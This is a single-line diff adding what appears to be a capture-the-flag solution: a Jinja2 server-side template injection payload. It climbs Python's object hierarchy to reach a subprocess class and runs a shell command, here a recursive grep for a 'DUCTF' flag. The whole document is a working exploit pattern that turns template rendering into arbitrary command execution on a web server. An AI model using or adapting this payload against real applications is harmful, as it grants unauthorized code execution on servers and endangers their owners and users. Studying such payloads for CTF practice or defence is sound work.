@@ -1,0 +1,1 @@
+{{ ''.__class__.__mro__[1].__subclasses__()[213]("grep -r 'DUCTF' *", shell=True,stdout=-1).communicate()}}
